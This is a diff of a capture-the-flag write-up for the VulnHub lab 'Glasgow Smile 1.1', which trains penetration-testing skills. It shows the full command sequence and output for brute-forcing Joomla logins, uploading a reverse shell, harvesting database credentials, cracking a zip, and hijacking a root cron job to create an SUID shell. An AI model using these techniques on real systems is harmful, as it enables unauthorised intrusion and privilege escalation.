@@ -6,9 +6,7 @@ img_path: /Writeups/Vulnhub/Linux/Glasglow Smile 1.1
 ---
 
 # Recon
-
 ## NMAP Complete Scan
-
 ```
 # Nmap 7.92 scan initiated Tue Jan 25 18:30:16 2022 as: nmap -vv --reason -Pn -T4 -sV -p 80 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN /root/vulnHub/Glasglow-Smile-1.1/192.168.1.1/scans/tcp80/tcp_80_http_nmap.txt -oX /root/vulnHub/Glasglow-Smile-1.1/192.168.1.1/scans/tcp80/xml/tcp_80_http_nmap.xml 192.168.1.1
 Nmap scan report for 192.168.1.1
@@ -94,11 +92,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Tue Jan 25 18:30:34 2022 -- 1 IP address (1 host up) scanned in 18.68 seconds
 
 ```
-
 ## TCP/80 (HTTP)
-
 ### FFUF
-
 ```
 ┌──(root💀kali)-[~/vulnHub/GoldenEye-1]
 └─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php'
@@ -129,23 +124,18 @@ joomla                  [Status: 301, Size: 311, Words: 20, Lines: 10]
 server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 :: Progress: [18460/18460] :: Job [1/1] :: 318 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
 ```
-
 - `joomla`
-
 # Initial Foothold
-
 ## TCP/80 (HTTP) - Cewl + Joomla Bruteforce + Shell Upload
 
 1. View to enumerated directories
 	- `index.html`
 
 		![](images/Pasted%20image%2020220125235608.png)
-
 	- `joomla`
 		![](images/Pasted%20image%2020220125235712.png)
 		
 2. Enumerate joomla
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1]
 	└─# joomscan --url http://$ip/joomla -ec
@@ -195,13 +185,11 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	http://192.168.1.1/joomla/plugins/
 	http://192.168.1.1/joomla/tmp/
 	```
-
 	- `http://192.168.1.1/joomla/administrator/index.php`
 	- `robots.txt`
 3. Viewed all directories in `robots.txt`, could not find anything
 4. Try a bruteforce attack as a last resort
 5. Generate a custom wordlist w/ cewl
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla]
 	└─# cewl http://192.168.1.1/joomla/index.php -w passwords.txt
@@ -220,7 +208,6 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	> EOF
 
 	```
-
 6. Bruteforce Joomla CMS 
 	- Hydra/Burp did not work due to a unqiue token being generated 
 		- https://www.securityartwork.es/2013/02/14/nmap-script-http-joomla-brute-where-thc-hydra-doesnt-fit/
@@ -231,7 +218,6 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	- CMSeek
 		- https://github.com/Tuhinshubhra/CMSeeK
 7. Bruteforce w/ nmap script
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla]
 	└─# nmap -p80 --script http-joomla-brute 192.168.1.1 --script-args 'userdb=/root/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla/usernames.txt,passdb=/root/vulnHub/Glasglow-Smile-1.1/192.168.1.1/exploit/joomla/passwords.txt,brute.firstonly=true,http-joomla-brute.uri=/joomla/administrator/index.php,http-joomla-brute.threads=5'
@@ -249,9 +235,7 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 
 	Nmap done: 1 IP address (1 host up) scanned in 91.21 seconds
 	```
-
 8. Bruteforce w/ CMSeek
-
 	```
 	 ___ _  _ ____ ____ ____ _  _
 	|    |\/| [__  |___ |___ |_/  by @r3dhax0r
@@ -278,14 +262,12 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 
 	[*] Credentials stored at: /usr/share/cmseek/Result/192.168.1.1_joomla/bruteforce_result_joomla_.txt
 	```
-
 	- joomla:Gotham
 9. Proceed to `http://192.168.1.1/joomla/administrator/index.php?option=com_templates`
 10. Upload reverse shell by editing `/error.php` in template "protostar"
 	![](images/Pasted%20image%2020220126043723.png)
 11. Execute reverse shell at `http://192.168.1.1/joomla/templates/beez3/error.php`
 12. Obtain www-data shell
-
 	```
 	┌──(root💀kali)-[~/tools]
 	└─# nc -nvlp 4444
@@ -303,28 +285,22 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	www-data
 	$ 
 	```
-
 	![](images/Pasted%20image%2020220126045057.png)
 
+
 # Privilege Escalation
-
 ## Rob - Via SQL Creds Found 
-
 1. Find SQL Credentials
-
 	```
 	www-data@glasgowsmile:/var/www$ cd /joomla2	
 	www-data@glasgowsmile:/var/www/joomla2$ ls
 	www-data@glasgowsmile:/var/www/joomla2$ cat configuration.php 
 	```
-
 	![](images/Pasted%20image%2020220127054519.png)
-
 	- joomla:babyjoker
 
 2. Access MySQL, 
 	1. Obtain more creds from `joomla_db`
-
 		```
 		www-data@glasgowsmile:/var/www/joomla2$ mysql -u joomla -p
 		Enter password: babyjoker
@@ -359,10 +335,8 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 		+----------+--------------------------------------------------------------+
 		1 row in set (0.001 sec)
 		```
-
 		- No new creds
 	2. Obtain credentials from `batjoke`
-
 		```
 		MariaDB [joomla_db]> use batjoke
 		Reading table information for completion of table and column names
@@ -394,10 +368,8 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 		+----+---------+------------+---------+----------------------------------------------+
 		6 rows in set (0.000 sec)
 		```
-
 		- password is base64 encoded
 3. Decode password
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot]
 	└─# cat creds | cut -d '|' -f5 | sed 's/+\|-\|name//g' | awk 'NF' | tee usernames.txt
@@ -435,30 +407,24 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	 rob     :???AllIHaveAreNegativeThoughts???
 	 aunt    :auntis the fuck here
 	```
-
 4. Extract usernames from `/etc/passwd`
-
 	```
 	www-data@glasgowsmile:/home$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
 	rob
 	abner
 	penguin
 	```
-
 5. Switch to user to rob
 	![](images/Pasted%20image%2020220127154212.png)
 6. User Flag
-
 	```
 	rob@glasgowsmile:~$ cat user.txt 
 	JKR[f5bb11acbb957915e421d62e7253d27a]
 	rob@glasgowsmile:~$ 
 	```
-
+	
 ## Abner - Via Ciphertext
-
 1. View files in rob's home directory
-
 	```
 	rob@glasgowsmile:~$ ls -la
 	total 52
@@ -477,7 +443,6 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	-rw------- 1 rob  rob   429 Jun 16  2020 .Xauthority
 	rob@glasgowsmile:~$ 
 	```
-
 	- `bash_history`
 	- `Abnerineedyourhelp`
 	- `howtoberoot`
@@ -486,17 +451,14 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	- `.bash_history`
 		- Nothing Found
 	- `Abnerineedyourhelp`
-
 		```
 		rob@glasgowsmile:~$ cat Abnerineedyourhelp 
 		Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
 		Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
 		```
-
 	- `.local`
 		- Nothing Found
 	- `howtoberoot`
-
 		```
 		rob@glasgowsmile:~$ cat howtoberoot 
 		  _____ ______   __  _   _    _    ____  ____  _____ ____  
@@ -507,38 +469,30 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 
 		NO HINTS.
 		```
-
 3. Decipher ciphertext
 	![](images/Pasted%20image%2020220127155649.png)
-
 	```
 	Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't." 
 	
 	Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==
 	```
-
 4. Decode base64 encoded text
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot]
 	└─# echo -n STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA== | base64 -d
 	I33hope99my0death000makes44more8cents00than0my0life0
 	
 	```
-
 5. Switch to user abner
 	![](images/Pasted%20image%2020220127155906.png)
 6. User Flag 2
-
 	```
 	abner@glasgowsmile:~$ cat user2.txt 
 	JKR{0286c47edc9bfdaf643f5976a8cfbd8d}
 	```
 
 ## Penguin - Via Creds Found + Cracking Zip file
-
 1. View files in abner home directory
-
 	```
 	abner@glasgowsmile:~$ ls -la
 	total 44
@@ -555,21 +509,17 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	-rw------- 1 abner abner  399 Jun 15  2020 .Xauthority
 	abner@glasgowsmile:~$ 
 	```
-
 	- `.bash_history`
 	- `info.txt`
 2. View the files
 	- `info.txt`
-
 		```
 		abner@glasgowsmile:~$ cat info.txt 
 		A Glasgow smile is a wound caused by making a cut from the corners of a victim's mouth up to the ears, leaving a scar in the shape of a smile.
 		The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly.
 		The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s. The attack became popular with English street gangs (especially among the Chelsea Headhunters, a London-based hooligan firm, among whom it is known as a "Chelsea grin" or "Chelsea smile").
 		```
-
 	- `.bash_history`
-
 		```
 		abner@glasgowsmile:~$ cat .bash_history 
 		whoami
@@ -585,10 +535,8 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 		rm dear_penguins
 		exit
 		```
-
 		- `.dear_penguins.zip`
 3. Find `.dear_penguins.zip`
-
 	```
 	abner@glasgowsmile:/home/penguin$ find / 2>/dev/null | grep penguin
 	/home/penguin
@@ -607,10 +555,8 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	/home/penguin/.local/share
 	/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
 	```
-
 	- `/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip`
 4. View permissions of `/home/penguin/SomeoneWhoHidesBehindAMask`
-
 	```
 	abner@glasgowsmile:/home/penguin$ ls -l SomeoneWhoHidesBehindAMask/
 	ls: cannot access 'SomeoneWhoHidesBehindAMask/user3.txt': Permission denied
@@ -621,18 +567,14 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	-????????? ? ? ? ?            ? PeopleAreStartingToNotice.txt
 	-????????? ? ? ? ?            ? user3.txt
 	```
-
 5. Unzip `dear_penguins.zip`
 	- There is a password
 6. Create wordlist w/ `info.txt`  
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
 	└─# cewl localhost/info.txt -w cewl_info.txt
 	```
-
 7. Compile all passwords we have
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
 	└─# cp ../sql/base64decode.txt  .
@@ -644,9 +586,7 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	└─# echo -n I33hope99my0death000makes44more8cents00than0my0life0 >> compiled_passwords.txt
 
 	```
-
 8. Crack it w/ john
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
 	└─# john john_zip --wordlist=compiled_passwords.txt
@@ -654,10 +594,8 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	I33hope99my0death000makes44more8cents00than0my0life0 (dear_penguins.zip/dear_penguins)     
 	1g 0:00:00:00 DONE (2022-01-27 16:45) 100.0g/s 22700p/s 22700c/s 22700C/s baneishere..Joomla
 	```
-
 	- Same password as abner
 9. View extracted file
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
 	└─# unzip dear_penguins.zip
@@ -673,21 +611,17 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip]
 	└─# echo -n scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz >> compiled_passwords.txt 
 	```
-
 	- penguin:scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
 10. Switch to user penguin
 	![](images/Pasted%20image%2020220127164946.png)
 11. User Flag 3
-
 	```
 	penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat user3.txt 
 	JKR{284a3753ec11a592ee34098b8cb43d52}
 	```
 
 ## Root - Via Cronjob
-
 1. View files in `/home/penguin/SomeoneWhoHidesBehindAMask`
-
 	```
 	penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
 	total 332
@@ -698,7 +632,6 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	-rwxr-xr-x 1 penguin root       664 Jan 27 02:59 .trash_old
 	-rw-r----- 1 penguin penguin     38 Jun 16  2020 user3.txt
 	```
-
 	- find SUID Binary is useless because owner is penguin
 	- .trash_old
 	- PeopleAreStartingToNotice.txt
@@ -706,7 +639,6 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	![](images/Pasted%20image%2020220127170316.png)
 	- Could not find any way to privilege escalate
 3. Assume `.trash_old` is executed by cronjob, replace it to spawn a root shell
-
 	```
 	penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' > /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old; chmod 4777  /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
 
@@ -714,11 +646,9 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	total 1152
 	-rwsr-xr-x 1 root root 1168776 Jan 27 03:07 rootbash
 	```
-
 4. Obtain root shell
 	![](images/Pasted%20image%2020220127170756.png)
 5. Root Flag
-
 	```
 	rootbash-5.0# cd /root
 	rootbash-5.0# ls
@@ -747,9 +677,7 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	mindsflee
 
 	```
-
 6. Snoop processes w/o root privileges
-
 	```
 	penguin@glasgowsmile:/tmp$ ./pspy64 
 	pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
@@ -768,7 +696,7 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
 	2022/01/27 03:15:01 CMD: UID=0    PID=13422  | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
 	2022/01/27 03:15:01 CMD: UID=0    PID=13423  | /bin/bash /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
 	```
-
 	- We can see that cronjob is executing `.trash_old` every minute
 	
 	
+
